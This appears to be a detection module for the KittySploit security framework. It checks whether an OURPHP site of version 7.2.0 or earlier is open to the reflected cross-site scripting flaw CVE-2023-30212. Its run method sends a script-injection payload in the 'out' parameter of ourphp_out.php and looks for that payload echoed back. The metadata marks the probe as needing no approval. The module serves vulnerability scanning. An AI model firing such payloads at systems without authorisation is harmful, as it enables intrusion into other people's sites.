#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""OURPHP <= 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'OURPHP <= 7.2.0 - Cross Site Scripting Detection',
        'description': 'OURPHP <= 7.2.0 is vulnerale to Cross Site Scripting (XSS) via /client/manage/ourphp_out.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xss', 'ourphp', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.ourphp.net/',
            'https://wanheiqiyihu.top/2023/03/27/OURPHP-v7-2-0-ourphp-out-php-Reflection-xss/',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-30212',
            'https://github.com/JasaluRah/Creating-a-Vulnerable-Docker-Environment-CVE-2023-30212-',
            'https://github.com/arunsnap/CVE-2023-30212-POC',
        ],
        'cve': 'CVE-2023-30212',
    }

    def run(self):
        r = self.http_request(method="GET", path='/client/manage/ourphp_out.php?ourphp_admin=logout&out=</script><script>alert(document.domain)</script>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ("location.href='../..</script><script>alert(document.domain)</script>'",)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="OURPHP <= 7.2.0 - Cross Site Scripting detected",
                path='/client/manage/ourphp_out.php?ourphp_admin=logout&out=</script><script>alert(document.domain)</script>',
            )
            return True
        return False

